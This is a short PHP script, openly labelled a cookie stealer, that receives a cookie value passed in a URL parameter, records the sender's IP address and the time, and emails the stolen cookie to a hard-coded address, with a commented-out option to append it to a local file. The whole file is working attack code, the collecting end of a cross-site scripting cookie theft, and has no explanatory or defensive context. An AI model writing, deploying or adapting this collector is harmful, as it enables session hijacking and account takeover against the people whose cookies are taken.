<?php
    if (isset($_GET['cookie'])) {
        $text = "\nNew cookie accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of F Y h:i:s A');
        $text .= "\n".str_repeat("=", 22) . "\n" . $_GET['cookie']."\n".str_repeat("=", 22)."\n";

        // Save steal cookie to file "cookie.txt"
        //$file = fopen("cookie.txt", "a");
        //fwrite($file, $text);
        //fclose($file);

        // Send Mail with steal cookie
        $to = 'eugene-msa@yandex.ru'; // change email
        $from = 'From: Cookie Stealer';
        $title = "QA cookie stealer";
        $message = $text;
        mail($to, $title, $message, $from);
    }
?>



